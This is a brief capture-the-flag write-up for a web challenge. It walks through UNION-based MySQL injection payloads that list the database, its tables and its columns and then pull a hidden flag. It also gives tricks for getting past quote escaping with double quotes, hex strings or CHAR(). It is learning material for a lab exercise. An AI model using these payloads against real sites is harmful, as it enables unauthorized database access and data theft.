The same website as `login as admin 0`

But different flag. Maybe we need to fetch the database to get it.

Combine the task `guestbook` and `login as admin 0`

```
\' UNION SELECT NULL,database(),NULL,NULL -- -

\' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database() -- -

# h1dden_f14g,user

\' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name="h1dden_f14g" -- -

```
We got the column `the_f14g`

Notable: After the `WHERE` clause, the string should be put in single quotes ,double quotes or backticks. But it will not working if you replace the `'` to `\'`.

There is some way to solve it.

1. Replace the `'` to `"`
2. Replace the string to hex e.g: `h1dden_f14g` -> `0x68316464656e5f66313467`
3. Use `Char()` to represent the string.

> [When to use single quotes, double quotes, and backticks in MySQL](https://stackoverflow.com/questions/11321491/when-to-use-single-quotes-double-quotes-and-backticks-in-mysql)

```
\' UNION SELECT NULL,the_f14g,NULL,NULL FROM login_as_admin0.h1dden_f14g -- -
```



